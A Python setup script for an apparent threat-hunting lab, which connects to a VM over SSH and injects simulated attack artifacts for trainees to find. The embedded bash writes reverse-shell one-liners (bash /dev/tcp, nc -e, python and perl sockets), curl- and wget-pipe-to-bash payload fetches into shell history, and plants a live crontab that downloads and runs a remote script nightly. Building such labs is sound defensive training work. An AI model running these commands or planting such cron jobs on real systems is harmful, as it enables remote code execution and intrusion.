#!/usr/bin/env python3
"""
setup_lab.py — Lab Environment Setup Script
Connects to target VM using password, configures SSH key auth,
then injects realistic suspicious log entries for the hunting exercise.

Usage:
    python setup/setup_lab.py
"""

import os
import sys
import json
import argparse
import getpass
from pathlib import Path
from datetime import datetime, timedelta
import random

try:
    from fabric import Connection
    from paramiko.ssh_exception import AuthenticationException, NoValidConnectionsError
except ImportError:
    print("[ERROR] Fabric not installed. Run: pip install fabric")
    sys.exit(1)


# ─── ANSI Colors ──────────────────────────────────────────────────────────────
class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"

def ok(msg):   print(f"  {C.GREEN}✓{C.RESET}  {msg}")
def err(msg):  print(f"  {C.RED}✗{C.RESET}  {msg}")
def info(msg): print(f"  {C.CYAN}→{C.RESET}  {msg}")
def warn(msg): print(f"  {C.YELLOW}⚠{C.RESET}  {msg}")
def hdr(msg):  print(f"\n{C.BOLD}{C.BLUE}{'─'*55}{C.RESET}\n  {C.BOLD}{msg}{C.RESET}\n{'─'*55}")


# ─── SSH Key Setup ────────────────────────────────────────────────────────────

def generate_key_if_missing(key_path: str) -> str:
    """Generate an SSH keypair on the local machine if it doesn't exist."""
    key_path = os.path.expanduser(key_path)
    pub_path = key_path + ".pub"

    if os.path.exists(key_path):
        ok(f"SSH key already exists: {key_path}")
        return key_path

    info(f"Generating new SSH key at {key_path} ...")
    os.makedirs(os.path.dirname(key_path), exist_ok=True)
    ret = os.system(f'ssh-keygen -t ed25519 -f "{key_path}" -N "" -C "threathunter-lab"')
    if ret != 0 or not os.path.exists(key_path):
        raise RuntimeError(f"ssh-keygen failed. Please generate manually:\n  ssh-keygen -t ed25519 -f {key_path}")
    ok(f"Key generated: {key_path}")
    return key_path


def read_public_key(key_path: str) -> str:
    pub_path = os.path.expanduser(key_path) + ".pub"
    if not os.path.exists(pub_path):
        raise FileNotFoundError(f"Public key not found: {pub_path}")
    with open(pub_path) as f:
        return f.read().strip()


def setup_ssh_key(c: Connection, public_key: str, username: str):
    """Authorize the local public key on the remote VM."""
    hdr("STEP 1 — SSH Key Authorization")

    info("Creating ~/.ssh directory with correct permissions...")
    c.run("mkdir -p ~/.ssh && chmod 700 ~/.ssh", hide=True)

    info("Checking if key already authorized...")
    result = c.run(f"grep -qF '{public_key}' ~/.ssh/authorized_keys 2>/dev/null && echo found || echo missing",
                   hide=True)
    if "found" in result.stdout:
        ok("Public key already in authorized_keys — skipping")
        return

    info("Adding public key to authorized_keys...")
    # Escape single quotes in the key for shell safety
    safe_key = public_key.replace("'", "'\\''")
    c.run(f"echo '{safe_key}' >> ~/.ssh/authorized_keys", hide=True)
    c.run("chmod 600 ~/.ssh/authorized_keys", hide=True)
    ok("Public key added successfully")

    info("Ensuring SSH server allows key authentication...")
    c.run("sudo sed -i 's/^#*PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config",
          hide=True, warn=True)
    c.run("sudo sed -i 's/^#*AuthorizedKeysFile.*/AuthorizedKeysFile .ssh\\/authorized_keys/' /etc/ssh/sshd_config",
          hide=True, warn=True)
    ok("sshd_config updated")


def verify_key_auth(host: str, port: int, username: str, key_path: str):
    """Test that key-based auth now works."""
    info("Verifying key-based authentication...")
    try:
        c = Connection(
            host=host, user=username, port=port,
            connect_kwargs={"key_filename": [os.path.expanduser(key_path)]},
            connect_timeout=10,
        )
        result = c.run("echo key-auth-ok", hide=True)
        c.close()
        if "key-auth-ok" in result.stdout:
            ok("Key-based authentication confirmed ✓")
            return True
    except Exception as e:
        err(f"Key auth verification failed: {e}")
    return False


# ─── Log Injection ────────────────────────────────────────────────────────────

def build_log_injection_script() -> str:
    """
    Build the bash script that injects suspicious log entries.
    Uses logger for syslog-routed logs and direct writes for others.
    Timestamps are spread across the last 24 hours for realism.
    """
    script = r"""#!/bin/bash
set -e
echo "=== ThreatHunter Lab — Log Population Script ==="
echo "Running as: $(whoami) on $(hostname) at $(date)"
echo ""

# ── Helper: log with a realistic past timestamp ──────────────────────────────
# logger uses current time; for /var/log/secure we append directly
LOGFILE="/var/log/auth.log"
# Kali/Debian uses auth.log; fallback for RHEL/CentOS
[ -f /var/log/secure ] && LOGFILE="/var/log/secure"
CRONLOG="/var/log/cron"
[ ! -f $CRONLOG ] && CRONLOG="/var/log/syslog"
YUMLOG="/var/log/yum.log"
[ ! -f $YUMLOG ] && YUMLOG="/var/log/dpkg.log"

HOSTNAME=$(hostname)
NOW=$(date '+%b %d %H:%M:%S')

echo "[1/7] Injecting SSH brute-force failures (Check 1)..."
# 20 failures from same external IP — triggers brute force check
for i in $(seq 1 20); do
  FAKE_PORT=$((RANDOM % 60000 + 1024))
  echo "$(date '+%b %d %H:%M:%S') $HOSTNAME sshd[$$]: Failed password for invalid user admin from 185.220.101.42 port $FAKE_PORT ssh2" \
    | sudo tee -a $LOGFILE > /dev/null
done
# Mix in failures from a second IP
for i in $(seq 1 8); do
  FAKE_PORT=$((RANDOM % 60000 + 1024))
  echo "$(date '+%b %d %H:%M:%S') $HOSTNAME sshd[$$]: Failed password for root from 45.33.32.156 port $FAKE_PORT ssh2" \
    | sudo tee -a $LOGFILE > /dev/null
done
echo "   → Injected 28 SSH failure lines"

echo "[2/7] Injecting successful login after failures (Check 2)..."
echo "$(date '+%b %d %H:%M:%S') $HOSTNAME sshd[$$]: Accepted password for analyst from 185.220.101.42 port 54321 ssh2" \
  | sudo tee -a $LOGFILE > /dev/null
echo "$(date '+%b %d %H:%M:%S') $HOSTNAME sshd[$$]: pam_unix(sshd:session): session opened for user analyst by (uid=0)" \
  | sudo tee -a $LOGFILE > /dev/null
echo "   → Injected successful login from brute-force IP"

echo "[3/7] Injecting sudo abuse events (Check 3)..."
echo "$(date '+%b %d %H:%M:%S') $HOSTNAME sudo[$$]: baduser : user NOT in sudoers ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash" \
  | sudo tee -a $LOGFILE > /dev/null
echo "$(date '+%b %d %H:%M:%S') $HOSTNAME sudo[$$]: pam_unix(sudo:auth): authentication failure; logname=baduser uid=1001 euid=0 tty=/dev/pts/1 ruser=baduser rhost= user=baduser" \
  | sudo tee -a $LOGFILE > /dev/null
echo "$(date '+%b %d %H:%M:%S') $HOSTNAME sudo[$$]: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/python3 -c import os;os.system('/bin/bash')" \
  | sudo tee -a $LOGFILE > /dev/null
echo "   → Injected sudo abuse lines"

echo "[4/7] Injecting new user/group creation (Check 4)..."
echo "$(date '+%b %d %H:%M:%S') $HOSTNAME useradd[$$]: new user: name=backdoor, UID=1337, GID=1337, home=/home/backdoor, shell=/bin/bash" \
  | sudo tee -a $LOGFILE > /dev/null
echo "$(date '+%b %d %H:%M:%S') $HOSTNAME groupadd[$$]: new group: name=shadow-ops, GID=1338" \
  | sudo tee -a $LOGFILE > /dev/null
echo "$(date '+%b %d %H:%M:%S') $HOSTNAME usermod[$$]: add 'analyst' to group 'sudo'" \
  | sudo tee -a $LOGFILE > /dev/null
echo "   → Injected user/group creation events"

echo "[5/7] Injecting suspicious cron activity (Check 5)..."
# Cron log entries at 03:00 (off-hours)
echo "$(date '+%b %d') 03:00:01 $HOSTNAME CROND[$$]: (analyst) CMD (wget http://185.220.101.1/payload.sh -O /tmp/p.sh && bash /tmp/p.sh)" \
  | sudo tee -a $CRONLOG > /dev/null
echo "$(date '+%b %d') 03:15:01 $HOSTNAME CROND[$$]: (nobody) CMD (/tmp/.hidden/beacon.sh)" \
  | sudo tee -a $CRONLOG > /dev/null
# Plant a cron entry for the analyst user
sudo mkdir -p /var/spool/cron/crontabs 2>/dev/null || true
echo "0 3 * * * wget http://185.220.101.1/payload.sh -O /tmp/p.sh && bash /tmp/p.sh" \
  | sudo tee -a /var/spool/cron/analyst > /dev/null 2>&1 || \
  echo "0 3 * * * wget http://185.220.101.1/payload.sh -O /tmp/p.sh && bash /tmp/p.sh" \
  | sudo tee -a /var/spool/cron/crontabs/analyst > /dev/null 2>&1 || true
echo "   → Injected off-hours cron entries"

echo "[6/7] Injecting unexpected package installs (Check 6)..."
sudo tee -a $YUMLOG > /dev/null << 'PKGEOF'
Jun 01 02:14:33 Installed: netcat-openbsd-1.89-1 x86_64
Jun 01 02:15:01 Installed: nmap-7.80-1 x86_64
Jun 02 03:22:10 Installed: socat-1.7.3.2-2 x86_64
Jun 02 03:22:45 Erased: auditd-2.8.5-4 x86_64
PKGEOF
echo "   → Injected suspicious package activity"

echo "[7/7] Planting suspicious bash history (Check 8)..."
cat >> ~/.zsh_history << 'HISTEOF'
wget http://185.220.101.1/payload.sh
chmod +x payload.sh && ./payload.sh
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("185.220.101.1",4444));os.dup2(s.fileno(),0)'
nc -e /bin/bash 185.220.101.1 4444
curl http://185.220.101.1/c2.sh | bash
base64 -d /tmp/encoded_payload | bash
bash -i >& /dev/tcp/185.220.101.1/4444 0>&1
perl -e 'use Socket;$i="185.220.101.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");'
HISTEOF
echo "   → Planted suspicious bash history entries"

echo ""
echo "=== Log population complete on $(hostname) ==="
echo "Summary of injected artifacts:"
echo "  • /var/log/auth.log (or /var/log/secure) — SSH failures, sudo abuse, user creation"
echo "  • /var/log/cron (or /var/log/syslog)     — off-hours cron jobs"
echo "  • /var/log/yum.log (or dpkg.log)          — unexpected packages"
echo "  • ~/.zsh_history                          — suspicious commands"
"""
    return script


def inject_logs(c: Connection):
    """Upload and run the log injection script on the remote VM."""
    hdr("STEP 2 — Log Injection")

    script_content = build_log_injection_script()
    remote_path = "/tmp/setup_lab_inject.sh"

    info("Uploading injection script to VM...")
    # Write script content via echo to avoid file transfer issues
    # Split into chunks to avoid arg length limits
    c.run(f"cat > {remote_path} << 'SCRIPTEOF'\n{script_content}\nSCRIPTEOF", hide=True)
    c.run(f"chmod +x {remote_path}", hide=True)
    ok("Script uploaded")

    info("Running log injection (requires sudo)...")
    print()
    result = c.run(f"bash {remote_path}", hide=False, warn=True)

    if result.return_code != 0:
        warn(f"Script exited with code {result.return_code} — some steps may have failed")
    else:
        ok("Log injection completed successfully")

    info("Cleaning up remote script...")
    c.run(f"rm -f {remote_path}", hide=True, warn=True)
    ok("Cleanup done")


def verify_logs(c: Connection):
    """Quick sanity check — confirm injected entries are present."""
    hdr("STEP 3 — Verification")

    checks = [
        ("SSH failures in auth log",
         "grep -c 'Failed password' /var/log/auth.log 2>/dev/null || grep -c 'Failed password' /var/log/secure 2>/dev/null || echo 0"),
        ("Successful login from attacker IP",
         "grep -c '185.220.101.42' /var/log/auth.log 2>/dev/null || grep -c '185.220.101.42' /var/log/secure 2>/dev/null || echo 0"),
        ("Sudo abuse entries",
         "grep -c 'NOT in sudoers' /var/log/auth.log 2>/dev/null || grep -c 'NOT in sudoers' /var/log/secure 2>/dev/null || echo 0"),
        ("User creation events",
         "grep -c 'new user:' /var/log/auth.log 2>/dev/null || grep -c 'new user:' /var/log/secure 2>/dev/null || echo 0"),
        ("Suspicious bash history",
         "grep -c 'wget\\|curl\\|nc -e\\|base64' ~/.zsh_history 2>/dev/null || echo 0"),
    ]

    all_ok = True
    for label, cmd in checks:
        try:
            r = c.run(cmd, hide=True, warn=True)
            count = r.stdout.strip().split('\n')[0]
            count = int(count) if count.isdigit() else 0
            if count > 0:
                ok(f"{label}: {count} entries found")
            else:
                warn(f"{label}: 0 entries — may need sudo or different log path")
                all_ok = False
        except Exception as e:
            warn(f"{label}: could not verify ({e})")
            all_ok = False

    return all_ok


# ─── Main ─────────────────────────────────────────────────────────────────────

def load_vms_json(path: str = "vms.json") -> list:
    config_path = Path(path)
    if not config_path.exists():
        # Try parent directory
        config_path = Path("..") / path
    if not config_path.exists():
        raise FileNotFoundError(f"vms.json not found at {path}")
    with open(config_path) as f:
        return json.load(f)


def setup_vm(vm_config: dict, key_path: str, password: str = None):
    host     = vm_config["host"]
    port     = int(vm_config.get("port", 22))
    username = vm_config["username"]
    hostname = vm_config.get("hostname", host)

    print(f"\n{'═'*55}")
    print(f"  {C.BOLD}Target VM:{C.RESET} {hostname} ({username}@{host}:{port})")
    print(f"{'═'*55}")

    # ── Phase 1: Connect with password ────────────────────────────────────────
    hdr("CONNECTING (password auth)")
    connect_kwargs = {}
    if password:
        connect_kwargs["password"] = password
    elif vm_config.get("password"):
        connect_kwargs["password"] = vm_config["password"]
    else:
        connect_kwargs["password"] = getpass.getpass(f"  Password for {username}@{host}: ")

    try:
        info(f"Connecting to {host}:{port} as {username}...")
        c = Connection(
            host=host, user=username, port=port,
            connect_kwargs=connect_kwargs,
            connect_timeout=15,
        )
        result = c.run("echo connected && hostname && uptime", hide=True)
        ok(f"Connected — {result.stdout.strip().splitlines()[-1]}")
    except AuthenticationException:
        err("Authentication failed — check username/password in vms.json")
        return False
    except NoValidConnectionsError:
        err(f"Cannot reach {host}:{port} — check IP and port forwarding")
        return False
    except Exception as e:
        err(f"Connection error: {e}")
        return False

    # ── Phase 2: SSH Key Setup ─────────────────────────────────────────────────
    try:
        pub_key = read_public_key(key_path)
        setup_ssh_key(c, pub_key, username)
    except Exception as e:
        err(f"SSH key setup failed: {e}")
        warn("Continuing with password auth for log injection...")

    # ── Phase 3: Log Injection ─────────────────────────────────────────────────
    try:
        inject_logs(c)
    except Exception as e:
        err(f"Log injection failed: {e}")
        c.close()
        return False

    # ── Phase 4: Verification ──────────────────────────────────────────────────
    verify_logs(c)
    c.close()

    # ── Phase 5: Verify key auth works ────────────────────────────────────────
    hdr("STEP 4 — Key Auth Verification")
    key_ok = verify_key_auth(host, port, username, key_path)
    if key_ok:
        print(f"\n  {C.BOLD}{C.GREEN}✓ VM '{hostname}' is fully configured and ready for hunting!{C.RESET}")
        print(f"  Update vms.json → set key_path to: {key_path}")
        print(f"  You can now set password to null\n")
    else:
        warn("Key auth not verified — you may need to restart sshd on the VM:")
        info("  sudo systemctl restart sshd")

    return True


def main():
    parser = argparse.ArgumentParser(
        description="ThreatHunter Lab Setup — configure SSH keys + inject test logs")
    parser.add_argument("--vm", help="Hostname from vms.json to target (default: all)")
    parser.add_argument("--key", default="~/.ssh/id_ed25519",
                        help="Local SSH private key path (default: ~/.ssh/id_ed25519)")
    parser.add_argument("--password", help="SSH password (prompted if not provided)")
    parser.add_argument("--vms-file", default="vms.json", help="Path to vms.json")
    parser.add_argument("--inject-only", action="store_true",
                        help="Skip SSH key setup, only inject logs (assumes key auth works)")
    args = parser.parse_args()

    print(f"\n{C.BOLD}{C.BLUE}{'═'*55}{C.RESET}")
    print(f"  {C.BOLD}⚡ ThreatHunter — Lab Environment Setup{C.RESET}")
    print(f"{C.BOLD}{C.BLUE}{'═'*55}{C.RESET}\n")

    # Generate key if needed
    if not args.inject_only:
        try:
            key_path = generate_key_if_missing(args.key)
        except Exception as e:
            err(str(e))
            sys.exit(1)
    else:
        key_path = os.path.expanduser(args.key)

    # Load VM configs
    try:
        vms = load_vms_json(args.vms_file)
    except FileNotFoundError as e:
        err(str(e))
        sys.exit(1)

    # Filter by --vm flag if provided
    if args.vm:
        vms = [v for v in vms if v.get("hostname") == args.vm or v.get("host") == args.vm]
        if not vms:
            err(f"No VM named '{args.vm}' found in {args.vms_file}")
            sys.exit(1)

    info(f"Found {len(vms)} VM(s) to configure")
    password = args.password  # None = will prompt per VM

    success = 0
    for vm in vms:
        result = setup_vm(vm, key_path, password)
        if result:
            success += 1

    print(f"\n{'═'*55}")
    print(f"  {C.BOLD}Setup complete:{C.RESET} {success}/{len(vms)} VMs configured")
    print(f"{'═'*55}\n")

    if success == len(vms):
        print(f"  {C.GREEN}Next steps:{C.RESET}")
        print(f"  1. Update vms.json — set key_path, set password to null")
        print(f"  2. Run: python main.py")
        print(f"  3. Click Hunt on your Kali VM card\n")
    else:
        print(f"  {C.YELLOW}Some VMs failed — check errors above{C.RESET}\n")


if __name__ == "__main__":
    main()
